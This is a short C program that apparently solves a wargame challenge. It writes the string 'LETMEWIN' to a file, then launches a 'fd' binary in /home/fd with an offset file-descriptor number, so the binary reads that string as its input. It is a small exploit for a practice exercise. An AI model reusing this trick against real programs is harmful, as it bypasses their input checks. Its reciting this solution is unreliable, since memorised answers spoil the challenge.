#include <stdio.h>
#include <fcntl.h>
#include <string.h>
#define FILENAME "file"
#define BUFFSIZE 32
#define EXECPATH "fd"
int main(){
		//making the fild and writing to it
		FILE* fd = fopen(FILENAME, "wb");
		char buff[BUFFSIZE] ="LETMEWIN\n\0";
		int bytes = fwrite(buff, sizeof(char), BUFFSIZE, fd);
		if (bytes < 0){
				printf("err writing");
				exit(1);
		}
		fclose(fd);
		int fd1 =  open(FILENAME, O_RDWR);

		int offset = 0;
		//clearing the buffer
		while(offset < BUFFSIZE)
				buff[offset++] = 0;

		//fd to buffer
		sprintf(buff,"%d", fd1 + 0x1234 );

		chdir("/home/fd");
		char* args[3];
		args[0] = "fd";
		args[1] = buff;
		args[2] = (char*)NULL;
		execve(EXECPATH, args, (char*)NULL);

}

